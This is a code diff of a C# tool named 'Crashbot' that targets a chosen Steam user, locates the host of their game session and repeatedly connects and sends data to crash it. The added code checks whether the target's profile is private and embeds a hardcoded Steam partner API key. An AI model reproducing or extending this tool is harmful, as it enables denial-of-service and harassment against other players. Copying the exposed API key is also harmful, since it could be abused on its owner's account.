@@ -1,6 +1,10 @@
 ﻿using Newtonsoft.Json.Linq;
+using SteamKit2;
 using Steamworks;
+using System.Diagnostics;
+using System.Net;
 using System.Reflection;
+using static SteamKit2.Internal.CMsgRemoteClientBroadcastStatus;
 
 namespace Crashbot
 {
@@ -55,9 +59,9 @@ namespace Crashbot
             else
             {
                 Console.Clear();
-                Console.WriteLine($"[{DateTime.Now}] UserName: '" + Steamworks.SteamFriends.GetPersonaName()+"'");
+                Console.WriteLine($"[{DateTime.Now}] UserName: '" + Steamworks.SteamFriends.GetPersonaName() + "'");
                 Console.WriteLine($"[{DateTime.Now}] SteamId: " + Steamworks.SteamUser.GetSteamID().m_SteamID);
-                Console.WriteLine($"[{DateTime.Now}] BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn()+"]");
+                Console.WriteLine($"[{DateTime.Now}] BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn() + "]");
             }
 
             while (true)
@@ -76,8 +80,14 @@ namespace Crashbot
                 var (originalUserName, res) = Program.GetUsersName(originalUserSteamid);
                 Console.WriteLine($"[{DateTime.Now}] Targeting '{originalUserName}' = {res}");
 
-                // Check if the target is the host, if not, target the host
-                ulong hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
+                // Check if the profile is private
+                bool isPrivateProfile = Program.GetUserVisibility(originalUserSteamid);
+                Console.WriteLine($"[{DateTime.Now}] Profile is {(isPrivateProfile ? "Private" : "Public")}");
+
+                ulong hostTarget = originalUserSteamid.m_SteamID;
+                // If profile is not private, check if the target is the host, if not, target the host
+                if (!isPrivateProfile)
+                    hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
 
                 // Connect to the target
                 Console.WriteLine($"[{DateTime.Now}] Connecting...");
@@ -112,8 +122,10 @@ namespace Crashbot
                 int count = 1;
                 while (crashed)
                 {
-                    hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
-                    var (conn_x, _) = Program.ConnectAndWait(hostTarget, LongTimeoutOptions);
+                    if (!isPrivateProfile)
+                        hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
+
+                    (var conn_x, _) = Program.ConnectAndWait(hostTarget, LongTimeoutOptions);
                     Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                     Thread.Sleep(500);
                     Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
@@ -125,24 +137,25 @@ namespace Crashbot
         private static string ReadSteamId()
         {
             string steamid = Console.ReadLine()?.Trim() ?? string.Empty;
-            
+
             if (string.IsNullOrEmpty(steamid))
                 Console.WriteLine($"[{DateTime.Now}] Invalid SteamID64");
 
             if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
                 steamid = steamid.Split('/').Last();
-            
+
             return steamid;
         }
 
         private static (string, bool) GetUsersName(CSteamID steamid)
         {
             var res = Steamworks.SteamFriends.RequestUserInformation(steamid, true);
-            Steamworks.SteamAPI.RunCallbacks();
+            string targetName;
 
-            string targetName = Steamworks.SteamFriends.GetFriendPersonaName(steamid);
-            if (targetName.Equals("[unknown]"))
+            if (res)
             {
+                Steamworks.SteamAPI.RunCallbacks();
+
                 bool wait = true;
                 Callback<PersonaStateChange_t>.Create(persona =>
                 {
@@ -157,18 +170,16 @@ namespace Crashbot
 
                 targetName = Steamworks.SteamFriends.GetFriendPersonaName(steamid);
             }
+            else
+            {
+                targetName = Steamworks.SteamFriends.GetFriendPersonaName(steamid);
+            }
 
-            res = Steamworks.SteamFriends.RequestUserInformation(steamid, true);
             return (targetName, res);
         }
 
         private static ulong VerifyHostSteamid(CSteamID user)
         {
-            if (!Steamworks.SteamFriends.GetFriendGamePlayed(user, out FriendGameInfo_t _))
-            {
-                Console.WriteLine($"[{DateTime.Now}] Unable to access game stat information");
-                return user.m_SteamID;
-            }
 
         FindRichPresnse:
             string oldRP = "";
@@ -186,9 +197,16 @@ namespace Crashbot
             Steamworks.SteamFriends.RequestFriendRichPresence(user);
             Steamworks.SteamAPI.RunCallbacks();
 
+            Console.WriteLine($"[{DateTime.Now}] Waiting for RichPresence...");
+            Stopwatch timer = Stopwatch.StartNew();
             while (true)
             {
-                Steamworks.SteamFriends.RequestFriendRichPresence(user);
+                if (timer.Elapsed.Minutes > 5)
+                {
+                    Steamworks.SteamFriends.RequestFriendRichPresence(user);
+                    timer.Restart();
+                }
+
                 Steamworks.SteamAPI.RunCallbacks();
                 int keycount = Steamworks.SteamFriends.GetFriendRichPresenceKeyCount(user);
 
@@ -202,7 +220,7 @@ namespace Crashbot
 
                 if (keycount > 0 && (oldKeyCount == 0 || currentRP != oldRP))
                 {
-                    Console.WriteLine($"[{DateTime.Now}] Rich Presence Changed Detected");
+                    Console.WriteLine($"[{DateTime.Now}] RichPresence Updated");
                     break;
                 }
 
@@ -225,7 +243,8 @@ namespace Crashbot
             return user.m_SteamID;
         }
 
-        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
+        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait
+            (ulong target, SteamNetworkingConfigValue_t[] options, CancellationToken? cancel = null)
         {
             CSteamID cSteamID = new(target);
 
@@ -245,6 +264,9 @@ namespace Crashbot
                 Steamworks.SteamAPI.RunCallbacks();
                 Steamworks.SteamNetworkingSockets.RunCallbacks();
                 Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);
+
+                if (cancel?.CanBeCanceled == true && cancel?.IsCancellationRequested == true)
+                    return (conn, info);
 
                 Thread.Sleep(10);
             }
@@ -274,6 +296,16 @@ namespace Crashbot
                     Thread.Sleep(10);
                 }
             }
+        }
+
+        private const string STEAM_API_KEY = "D3AC90289D43FC75AFDC81AF39CBF5DC";
+
+        private static bool GetUserVisibility(CSteamID steamid)
+        {
+            string url = "https://partner.steam-api.com/ISteamUser/GetPlayerSummaries/v2/?key=" + STEAM_API_KEY + "&steamids=" + steamid.m_SteamID;
+            string response = new HttpClient().GetStringAsync(url).Result;
+            JObject json = JObject.Parse(response);
+            return json["response"]["players"][0]["communityvisibilitystate"].Value<int>() == 1;
         }
     }
 }
